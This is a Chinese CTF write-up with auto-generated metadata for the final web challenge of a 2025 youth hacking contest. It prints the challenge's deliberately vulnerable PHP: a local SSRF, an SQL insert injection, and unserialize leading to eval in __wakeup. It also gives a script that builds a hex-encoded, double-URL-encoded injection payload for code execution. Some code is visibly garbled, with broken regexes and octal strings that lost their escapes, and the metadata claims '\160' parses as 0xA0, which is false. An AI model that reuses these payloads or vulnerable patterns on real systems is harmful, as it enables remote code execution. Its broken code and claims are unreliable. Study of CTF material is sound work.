---
title: 极客少年挑战赛2025决赛的最后一题
contest: 极客少年挑战赛2025决赛
year: 2025
difficulty: medium
vuln_type: ssrf
tags:
- SQL注入
- PHP反序列化
- WAF绕过
- 进制转换字符串
- Expression类__wakeup
- REMOTE_ADDR SSRF
- hex编码
attack_chain: index.php SSRF→sql.php?action=add入库→action=query取出→unserialize触发Expression.__wakeup→eval($this->expression)→进制转换字符串绕字母黑名单
key_payload: 'filter: select|update|from|insert|delete|union|order|and|or|''|"|\;preg_match(''/a-z/im'', $this->expression);hex编码反序列化串;($_="160150160151156146157")() 进制转字符串'
one_liner: 极客少年挑战赛2025决赛Web：SSRF+SQL注入+PHP反序列化触发eval+进制转换字符串绕字母
lesson: REMOTE_ADDR==127.0.0.1本地SSRF+hex编码反序列化串+八进制字符串绕字母黑名单
quality: high
full_path: 极客少年挑战赛2025决赛的最后一题.full.md
meta_path: 极客少年挑战赛2025决赛的最后一题.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 极客少年挑战赛2025决赛的最后一题。极客少年挑战赛2025决赛Web：SSRF+SQL注入+PHP反序列化触发eval+进制转换字符串绕字母。经验：REMOTE_ADDR==127.0.0.1本地SSRF+hex编码反序列化串+八进制字符串绕字母黑名单
category: web
subcategory: web_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/267609.html
reasoning_chain:
- index.php action=1 调 sql.php?action=add&value 入库 → 触发点：REMOTE_ADDR==127.0.0.1 本地 SSRF
- sql.php 单独校验 REMOTE_ADDR=127.0.0.1 + REQUEST_URI 黑名单 → 假设：必须从本机访问
- 动作：构造 index.php?action=1&value=test 入库 → 观察：返回 Record added id
- 入库字符串含序列化串 + 单引号转义 → 假设：hex 编码可彻底规避字符转义
- 动作：serialize(Expression)→bin2hex→0x... 写入 → 观察：hex 写入被识别为字符串
- query 接口 unserialize($resp['value']) → 假设：触发 Expression.__wakeup
- __wakeup 含 eval($this->expression) + preg_match('/a-z/im', ...) 黑名单 → 假设：字母全禁
- 假设：八进制字符串可绕字母正则 → 动作：'160150160151156146157' 是 'system' 的八进制编码
- PHP 字符串特性：'\160' 被解析为 0xA0 → 动作：'($_="160150160151156146157")()' 触发
- 观察：exec('ls /') 拿 flag → 完成
failed_attempts:
- 试图直接写 system('cat /flag') → 失败：preg_match('/a-z/im') 拦字母
- 试图用 base64 + eval → 失败：base64 字符含字母
- 试图用 ${_GET} 取参 → 失败：$_GET 变量名含字母
- 试图短标签 <?= ?> 跳过 eval → 失败：触发点在 __wakeup 不在 include
key_observations:
- 八进制字符串 '\160\150...' 可绕过字母黑名单（PHP 字符串自动转义）
- PHP 反序列化 wakeup 钩子是 eval 注入入口
- hex 编码入库避免单引号转义是关键
- 双层 SSRF：index.php SSRF→sql.php REMOTE_ADDR 校验
- preg_match('/a-z/im') 加 /i 修饰符同时禁大小写
prerequisites:
- PHP 字符串八进制/十六进制转义规则
- PHP 反序列化 __wakeup 触发链
- PCRE 修饰符 /i /m /s 含义
- SSRF 内网穿透 + REMOTE_ADDR 伪造
---
# 极客少年挑战赛2025决赛的最后一题

> 原文: https://www.ctfiot.com/267609.html
> ID: 267609

其他的题，能看到的我大多都做了。

按照印象说一下一些关键点。

关于PWN的题没啥好说的，就是简单溢出。还返回了put函数的地址，然后本地就可以计算就是了。

关于PHP混淆的那个，格式化代码后，把eval换成print，就可以直接打印出来flag了。

word那个，当成zip解压后，搜索那个***.cn的关键词也能直接看到。当然具体我没法提交，不知道后面那个参数是不是坑，也不知道。

主要是说最后一个题。是一个web的，比较综合。

需要的技能大概是 sql注入+php的反序列化，这次这个序列化，还比较有意思点（如果按照了主办方的想法的话，而实际上他们有一个代码错误，导致难度大大降低了，哈哈）

index.php:

sql.php

流程大概比较简单，

所以这里入库有3种处理方式。保证unserialize可以正常解码

一是把入库的代码$s_sql = strtr($s, [“\”=>”\\”, “‘” => “\'”]);

二是修改序列化后的字符长度。

三是hex编码。

最后给出一个测试的参数

这个题就好有意思啊，又不是真的难，但是基础要求得就比较多。


```
<?php 

if(empty($_REQUEST))
{
    highlight_file(__FILE__);
    exit();
}

//error_reporting(0);

if(preg_match('/select|update|from|insert|delete|union|order|and|or|'|"|\\/im', $_GET['value']))
{
die('Hacker!');
}

switch ($_GET['action']) {
case '1':
$resp = file_get_contents('http://127.0.0.1/sql.php?action=add&value='.$_GET['value']);
        echo $resp;
        break;
    case '2':
$resp = file_get_contents('http://127.0.0.1/sql.php?action=query&value='.$_GET['value']);
$resp = json_decode($resp, true);
        if($resp['serialized'])
        {
$value = unserialize($resp['value']);
$resp['value'] = $value->expression;
$resp['result'] = $value->value;
}
echo json_encode($resp);
        break;

    default:
die();
        break;
}

class Expression
{
public $expression;
    public $value;

    function __wakeup()
    {
if(preg_match('/a-z/im', $this->expression))
        {
$this->expression = 'die("Hacker!");';
}
$this->value = eval('return ' .$this->expression.';');
}

function __toString()
    {
return $this->value;
}

}

?>
<?php 

if(empty($_REQUEST))
{
    highlight_file(__FILE__);
    exit();
}

if($_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
{
die('Access denied.');
}

if(preg_match('/select|update|from|insert|delete|union|order|and|or|'|"|\\/im', $_SERVER['REQUEST_URI']))
{
die('Hacker!');
}

include 'conn.php';

switch ($_GET['action']) {
case 'add':
$result = $conn->query("insert into contents (serialized, value) values (0, '".$_GET['value']."'); ");
        echo 'Record added with id:'.$conn->insert_id;
        break;
    case 'query':
$result = $conn->query("select * from  contents where id= ".intval($_GET['value']). ";");
        echo json_encode($result->fetch_assoc());
        break;

    default:
// code...
break;
}

?>
$data = new Expression();
$data->expression = '($_="160150160151156146157")();'; 

$data->value = '1';

$s = serialize($data);
$hex = bin2hex($s);

$payload = "a'),(1,0x{$hex}";
$param = urlencode(urlencode($payload));

echo $param;
```
